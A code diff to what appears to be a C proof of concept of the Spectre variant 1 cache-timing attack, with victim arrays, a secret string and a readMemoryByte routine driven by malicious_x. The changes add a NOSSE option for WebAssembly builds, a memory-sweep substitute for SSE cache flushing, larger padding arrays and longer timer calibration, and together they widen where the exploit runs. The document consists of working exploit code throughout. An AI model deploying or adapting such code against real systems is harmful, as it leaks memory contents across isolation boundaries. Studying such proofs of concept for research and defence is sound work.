@@ -21,6 +21,7 @@
 #include <stdint.h>
 
 #ifdef WASM
+#define NOSSE
 #define NOSSE2
 #define NORDTSC
 #else
@@ -60,6 +61,10 @@
 #endif
 #endif /* ifdef _MSC_VER */
 
+// #ifdef NOSSE
+// #define NOSSE2
+// #endif
+
 #ifdef NOSSE2
 #define NORDTSCP
 #define NOMFENCE
@@ -70,7 +75,7 @@
 Victim code.
 ********************************************************************/
 unsigned int array1_size = 16;
-uint8_t unused1[64];
+uint8_t unused1[64*64];
 uint8_t array1[16] = {
   1,
   2,
@@ -89,8 +94,10 @@ uint8_t array1[16] = {
   15,
   16
 };
-uint8_t unused2[64];
+uint8_t unused2[64*64];
 uint8_t array2[256 * 512];
+
+uint8_t unused3[64*64];
 
 char * secret = "The Magic Words are Squeamish Ossifrage.";
 
@@ -149,8 +156,8 @@ int get_counter();
 #endif
 
 #ifdef NOCLFLUSH
-#define CACHE_FLUSH_ITERATIONS 131072
-#define CACHE_FLUSH_STRIDE 4096
+#define CACHE_FLUSH_ITERATIONS 65536
+#define CACHE_FLUSH_STRIDE 64
 uint8_t cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];
 
 /* Flush memory using long SSE instructions */
@@ -158,14 +165,14 @@ void flush_memory_sse(uint8_t * addr)
 {
   float * p = (float *)addr;
   float c = 0.f;
-#ifndef WASM
+#ifndef NOSSE
   __m128 i = _mm_setr_ps(c, c, c, c);
 #endif
   int k, l;
   /* Non-sequential memory addressing by looping through k by l */
   for (k = 0; k < 4; k++)
     for (l = 0; l < 4; l++)
-#ifndef WASM
+#ifndef NOSSE
       _mm_stream_ps(&p[(l * 4 + k) * 4], i);
 #else
       p[(l * 4 + k) * 4] = c;
@@ -206,11 +213,24 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     for (i = 0; i < 256; i++)
       _mm_clflush( & array2[i * 512]); /* intrinsic for clflush instruction */
 #else
+#ifndef NOSSE
     /* Flush array2[256*(0..255)] from cache
        using long SSE instruction several times */
     for (j = 0; j < 16; j++)
+    {
+      
       for (i = 0; i < 256; i++)
         flush_memory_sse( & array2[i * 512]);
+    }
+#else
+      /* Alternative to using sse instructions to flush the CPU cache */
+      /* Read addresses at 4096-byte intervals out of a large array.
+         Do this around 2000 times, or more depending on CPU cache size. */
+
+      for(l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l-= CACHE_FLUSH_STRIDE) {
+        junk2 = cache_flush_array[l];
+      } 
+#endif /* NOSSE */
 #endif
 
     /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
@@ -297,6 +317,12 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 #endif
 #else
 #ifndef NOMFENCE
+      int m;
+      for (m=0;m<50;m++)
+      {
+        reset_counter();
+        time1 += get_counter();
+      }
       _mm_mfence();
       reset_counter();
       _mm_mfence();
@@ -307,7 +333,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       // printf("time2: %d\n", time2);
 #else
       int m;
-      for (m=0;m<30;m++)
+      for (m=0;m<50;m++)
       {
         reset_counter();
         time1 += get_counter();
@@ -346,7 +372,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       }
     }
     if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
-      break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
+      break; /* Clear success if best is > 2*runner-up + 5 or 10/0) */
   }
   // printf("mins: %d: %d; %d: %d ", midx, results2[midx], midx2, results2[midx2]);
   // for (i = 0; i < 256; i++) {printf("%d ",results2[i]);}
@@ -360,7 +386,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 int g_argc              = 0;
 const char * * g_argv = NULL;
 #ifdef NORDTSC
-int myarray[512] = {45};
+int myarray[64*64] = {45};
 int counter = 0;
 pthread_mutex_t lock;
 int go = 1;
@@ -516,6 +542,11 @@ int main(int argc,
     printf("RDTSCP_SUPPORTED ");
   #else
     printf("RDTSCP_NOT_SUPPORTED ");
+  #endif
+  #ifdef NOSSE
+    printf("SSE_DISABLED ");
+  #else
+    printf("SSE_ENABLED ");
   #endif
   #ifndef NOMFENCE
     printf("MFENCE_SUPPORTED ");
